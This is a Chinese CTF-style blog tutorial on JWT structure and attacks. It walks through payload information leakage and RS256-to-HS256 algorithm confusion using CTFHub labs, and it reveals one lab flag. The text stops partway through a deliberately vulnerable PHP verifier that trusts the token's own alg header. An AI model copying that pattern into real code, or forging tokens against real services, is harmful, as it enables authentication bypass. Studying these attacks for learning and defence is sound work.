{"title":"浅析JWT Attack","uid":"a302f7d4a9c4a8ebcf973c7c3ec757d6","slug":"浅析JWT Attack","date":"2022-11-27T06:58:30.000Z","updated":"2023-03-14T07:25:14.000Z","comments":true,"path":"api/articles/浅析JWT Attack.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141525110.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于合天安全实验室<a href=\"https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA\">https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在2022祥云杯时遇到有关JWT的题，当时没有思路，对JWT进行学习后来对此进行简单总结，希望能对正在学习JWT的师傅们有所帮助。</p>\n<h1 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h1><p>JWT，即<code>JSON WEB TOKEN</code>，它是一种用于通信双方之间传递安全信息的简洁的、URL安全的表述性声明规范，是一种标准化的格式，用于在系统之间发送经过加密签名的JSON数据，·理论上可以包含任何类型的数据，但最常用于发送关于用户的信息（“声明”），以进行身份认证、会话处理和访问控制。</p>\n<p>简单了解了它的定义后，我们接下来来看一下JWT的组成部分<br>它分为三个部分，如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、Headers<span class=\"token punctuation\">:</span>头部\n<span class=\"token number\">2</span>、Payload<span class=\"token punctuation\">:</span>有效载荷\n<span class=\"token number\">3</span>、Signature<span class=\"token punctuation\">:</span>签名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这三个部分以<code>.</code>符号来连接，所以JWT的格式通常是<code>xxx.yyy.zzz</code>这种样子</p>\n<h2 id=\"Headers\"><a href=\"#Headers\" class=\"headerlink\" title=\"Headers\"></a>Headers</h2><p><code>Headers</code>通常由两部分组成，<code>令牌的类型</code>和<code>签名算法</code>，常见的算法有很多种，例如 <code>HMAC SHA256 </code>或 <code>RSA</code>。但它也还有一个<code>kid</code>参数，这是一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥。</p>\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ewogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这就是一个<code>Headers</code>，当我们对它进行Base64解码就可以看到它的具体内容，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token string double-quoted-string\">\"alg\"</span><span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"HS256\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string double-quoted-string\">\"typ\"</span><span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"JWT\"</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><code>alg</code>指的就是算法，这里的算法就是<code>HS256</code>，<code>typ</code>指的是令牌类型。<br>这里需要说明一点，就是明文在加密时其实采用的是<code>Base64URL</code>加密，这种加密方式并非<code>Base64encode</code>+<code>URLencode</code>，而是对一些特殊字符进行了替换，具体说明如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>JWT 作为一个令牌(token)，有些场合可能会放到 URL(比如 api.example.com/?token=xxx)。Base64有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。</p></blockquote>\n<h2 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload\"></a>Payload</h2><p>有效载荷就是存放有效信息的地方，其中包含声明。声明包含三个部分<br>1、<strong>已注册声明</strong><br>这个部分的话就是已经预先定义过的声明，常见的声明主要有以下几种</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">iss<span class=\"token operator\">:</span> jwt签发者\nsub<span class=\"token operator\">:</span> jwt所面向的用户\naud<span class=\"token operator\">:</span> 接收jwt的一方\nexp<span class=\"token operator\">:</span> jwt的过期时间，这个过期时间必须要大于签发时间\nnbf<span class=\"token operator\">:</span> 定义在什么时间之前，该jwt都是不可用的<span class=\"token punctuation\">.</span>\niat<span class=\"token operator\">:</span> jwt的签发时间\njti<span class=\"token operator\">:</span> jwt的唯一身份标识，主要用来作为一次性token<span class=\"token punctuation\">,</span>从而回避重放攻击。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>2、<strong>公共的声明</strong><br>这些可以由使用 JWT 的人随意定义，一般用于添加用户的相关信息或其他业务需要的必要信息。但不建议添加敏感信息，因为该部分在客户端可进行解码.<br>3、<strong>私有的声明</strong><br>这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息。</p>\n<p>示例如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">ewoJInN1YiI6ICJhZG1pbiIsCiAgICAidXNlcl9yb2xlIiA6ICJhZG1pbiIsCiAgICAiaXNzIjogImFkbWluIiwKICAgICJpYXQiOiAxNTczNDQwNTgyLAogICAgImV4cCI6IDE1NzM5NDAyNjcsIAogICAgIm5iZiI6IDE1NzM0NDA1ODIsIAogICAgImp0aSI6ICJkZmY0MjE0MTIxZTgzMDU3NjU1ZTEwYmQ5NzUxZDY1NyIgICAKfQ<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>进行<code>base64URL</code>解码，结果如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token string\">\"sub\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span>\t\t\t\t<span class=\"token comment\">//jwt所面向的用户</span>\n    <span class=\"token string\">\"user_role\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span>    \t<span class=\"token comment\">//当前登录用户</span>\n    <span class=\"token string\">\"iss\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span>          \t<span class=\"token comment\">//该JWT的签发者,有些是URL</span>\n    <span class=\"token string\">\"iat\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1573440582</span><span class=\"token punctuation\">,</span>        <span class=\"token comment\">//签发时间</span>\n    <span class=\"token string\">\"exp\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1573940267</span><span class=\"token punctuation\">,</span>        <span class=\"token comment\">//过期时间</span>\n    <span class=\"token string\">\"nbf\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1573440582</span><span class=\"token punctuation\">,</span>        <span class=\"token comment\">//该时间之前不接收处理该Token</span>\n    <span class=\"token string\">\"jti\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"dff4214121e83057655e10bd9751d657\"</span>   <span class=\"token comment\">//Token唯一标识</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Signature\"><a href=\"#Signature\" class=\"headerlink\" title=\"Signature\"></a>Signature</h2><p>由于头部和有效载荷以明文形式存储，因此，需要使用签名来防止数据被篡改。所以这部分是一个签证信息，这个签证信息由三部分组成</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token number\">1</span>、header <span class=\"token punctuation\">(</span>base64URL编码<span class=\"token punctuation\">)</span>\n<span class=\"token number\">2</span>、payload <span class=\"token punctuation\">(</span>base64URL编码<span class=\"token punctuation\">)</span>\n<span class=\"token number\">3</span>、secret（密钥）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>它的计算方式如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">Signature</span><span class=\"token operator\">=</span><span class=\"token function\">HMACSHA256</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64UrlEncode</span><span class=\"token punctuation\">(</span>header<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".\"</span> <span class=\"token operator\">+</span><span class=\"token function\">base64UrlEncode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>secret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//假设这里是HS256算法，如果是其他算法的话开头设置为其他算法即可</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>现在了解了JWT的大致作用和其组成，接下来来学习一下JWT攻击。</p>\n<h1 id=\"JWT-攻击\"><a href=\"#JWT-攻击\" class=\"headerlink\" title=\"JWT 攻击\"></a>JWT 攻击</h1><p>JWT攻击有多种情况，现在来对其进行逐一讲解。</p>\n<h2 id=\"敏感信息泄露\"><a href=\"#敏感信息泄露\" class=\"headerlink\" title=\"敏感信息泄露\"></a>敏感信息泄露</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>JWT保证的是数据传输过程中的完整性而不是机密性。</p></blockquote>\n<p>因为JWT的<code>payload</code>部分是使用<code>Base64url</code>编码的，所以它其实是相当于明文传输的，当<code>payload</code>中携带了敏感信息时，我们对<code>payload</code>部分进行<code>Base64url</code>解码，就可以读取到<code>payload中</code>携带的敏感信息。</p>\n<h3 id=\"靶场演示\"><a href=\"#靶场演示\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h3><p>题目链接<a href=\"https://www.ctfhub.com/#/skilltree\">https://www.ctfhub.com/#/skilltree</a><br>题目描述如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}</p></blockquote>\n<p>进入环境后发现一个登录框<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152818.png\" alt=\"在这里插入图片描述\"><br>随便输入账号密码，登录后发现界面如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152812.png\" alt=\"在这里插入图片描述\"><br>查看此时的JWT<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152825.png\" alt=\"在这里插入图片描述\"><br>想到题目中说头部和载荷可能会有敏感泄露，将值取出分别进行<code>Base64URL</code>解码<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152832.png\" alt=\"在这里插入图片描述\"><br>两处拼接一下，得到<code>ctfhub&#123;bb89d985db8cea6a2f2d34cb&#125;</code></p>\n<h2 id=\"算法修改攻击\"><a href=\"#算法修改攻击\" class=\"headerlink\" title=\"算法修改攻击\"></a>算法修改攻击</h2><p>首先来简述一下JWT中两个常用的加密算法</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证<br>RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p></blockquote>\n<p>从上面不难看出，<code>HS256</code>自始至终只有一个密钥，而<code>RS256</code>是有两个密钥的。<br>在通常情况下，<code>HS256</code>的密钥我们是不能取到的，<code>RS256</code>的密钥也是很难获得的，<code>RS256</code>的的公钥相对较容易获取，但无论是<code>HS256</code>加密还是<code>RS256</code>加密，都是无法实现伪造JWT的，但当我们修改<code>RSA256</code>算法为<code>HS256</code>算法时，后端代码会使用公钥作为密钥，然后用<code>HS256</code>算法验证签名，如果我们此时有公钥，那么此时我们就可与实现JWT的伪造。</p>\n<h3 id=\"靶场演示-1\"><a href=\"#靶场演示-1\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h3><p>题目链接<a href=\"https://www.ctfhub.com/#/skilltree\">https://www.ctfhub.com/#/skilltree</a></p>\n<p>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。</p></blockquote>\n<p>进入环境后发现题目代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">JWTHelper</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$alg</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'HS256'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token class-name static-context\">JWT</span><span class=\"token operator\">::</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$alg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$alg</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'HS256'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">JWTHelper</span><span class=\"token operator\">::</span><span class=\"token function\">getHeader</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$algs</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_merge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token operator\">-></span><span class=\"token property\">alg</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$alg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token class-name static-context\">JWT</span><span class=\"token operator\">::</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$algs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getHeader</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$jwt</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$tks</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$jwt</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">list</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$headb64</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$bodyb64</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cryptob64</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$tks</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">JWT</span><span class=\"token operator\">::</span><span class=\"token function\">jsonDecode</span><span class=\"token punctuation\">(</span><span class=\"token class-name static-context\">JWT</span><span class=\"token operator\">::</span><span class=\"token function\">urlsafeB64Decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$headb64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$header</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$FLAG</span> <span class=\"token operator\">=</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"FLAG\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$PRIVATE_KEY</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/privatekey.pem\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$PUBLIC_KEY</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./publickey.pem\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string 